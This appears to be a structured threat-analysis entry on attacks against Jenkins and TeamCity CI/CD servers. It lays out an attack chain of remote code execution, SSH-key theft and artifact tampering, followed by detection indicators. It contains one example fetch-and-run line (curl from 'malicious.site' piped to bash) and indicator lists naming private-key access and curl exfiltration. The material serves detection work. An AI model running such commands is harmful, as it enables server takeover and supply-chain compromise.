package_info.package_versions: Jenkins: versions vulnerable to CVE-2024-23897; TeamCity: versions vulnerable to CVE-2023-42793
package_info.why_malicious: The vulnerabilities allow remote code execution (RCE) on CI/CD servers, enabling attackers to compromise the build process, inject malicious code, steal sensitive assets (source code, signing certificates), and subvert software supply chains, putting downstream consumers at risk.

execution_context.file_location: Jenkins core server process (exploited via HTTP API endpoints)

malicious_snippets.code_snippet: Attacker-supplied payload executed via Jenkins RCE (e.g., curl http://malicious.site/payload.sh | bash)
malicious_snippets.code_behavior: At runtime, the attacker exploits the Jenkins RCE vulnerability to execute arbitrary shell commands, which can download and run further malicious payloads, exfiltrate secrets, or modify build artifacts, resulting in full compromise of the CI/CD environment.

malice_analysis.why_suspicious: Remote code execution on a CI/CD server is highly suspicious, as it allows attackers to run arbitrary commands outside of normal build operations.
malice_analysis.violated_expectations: CI/CD servers should only execute code defined in trusted build scripts; arbitrary code execution via network requests is never expected.
malice_analysis.similar_legitimate_use: Automated build scripts may download dependencies, but never via attacker-controlled input or endpoints.
key_indicators: Execution of shell commands from HTTP request input
Network connections to untrusted external domains
Modification of build artifacts outside normal workflow

execution_context.file_location: Injected into build scripts or environment variables

malicious_snippets.code_behavior: After initial compromise, the attacker reads sensitive files (e.g., SSH keys) and exfiltrates them to an external server, enabling further lateral movement or credential theft.

malice_analysis.why_suspicious: Exfiltration of private keys or secrets from a build server is a clear sign of malicious activity.
malice_analysis.violated_expectations: Build scripts should never access or transmit sensitive credentials outside the organization.
malice_analysis.similar_legitimate_use: None; legitimate builds do not exfiltrate secrets.
key_indicators: Access to ~/.ssh/id_rsa or other sensitive files
Outbound network requests to unknown domains
Use of curl or similar tools for data exfiltration

execution_context.trigger: runtime (supply chain attack via artifact tampering)
execution_context.file_location: Injected into build pipeline or artifact signing process

malicious_snippets.code_snippet: Malicious code injected into compiled artifacts or packages before distribution (e.g., adding a backdoor to a .jar or .exe file)
malicious_snippets.code_language: varies (depends on build target, e.g., Java, Python, etc.)
malicious_snippets.code_behavior: During the build process, the attacker modifies the output artifacts to include malicious payloads, which are then distributed to downstream consumers, enabling widespread compromise.

malice_analysis.why_suspicious: Unauthorized modification of build artifacts is a hallmark of supply chain attacks.
malice_analysis.violated_expectations: Build outputs should match source code and be verifiable; unexpected changes indicate compromise.
malice_analysis.similar_legitimate_use: None; only trusted build steps should modify artifacts.
key_indicators: Unexpected code or binaries in distributed packages
Build logs showing unauthorized file modifications

attack_chain.action: Attacker exploits Jenkins/TeamCity RCE vulnerability to gain code execution on CI/CD server.
attack_chain.leads_to: Initial access and control over build environment

attack_chain.action: Attacker exfiltrates sensitive files (e.g., SSH keys, signing certificates) from compromised server.
attack_chain.leads_to: Credential theft and potential lateral movement

attack_chain.action: Attacker injects malicious code into build artifacts, compromising downstream software consumers.

behavioral_signatures: Unexpected shell command execution via CI/CD server HTTP endpoints
Outbound network connections to untrusted or attacker-controlled domains
Access to sensitive files (e.g., ~/.ssh/id_rsa, signing keys) by build processes
Modification of build artifacts outside of normal build steps
file_indicators: Build scripts or environment variables containing suspicious shell commands
Artifacts with unexpected changes or hash mismatches
Logs showing execution of commands not present in source repository
network_indicators: Connections to domains such as malicious.site or other known C2 infrastructure
Unusual POST requests from build servers to external IPs
detection_knowledge.how_to_detect: Monitor CI/CD server logs for signs of RCE exploitation, such as execution of unexpected shell commands or network requests to untrusted domains. Implement file integrity monitoring on build scripts and output artifacts to detect unauthorized modifications. Alert on access to sensitive files by build processes and on outbound connections to suspicious endpoints. Regularly audit build environments for changes in configuration or injected code.
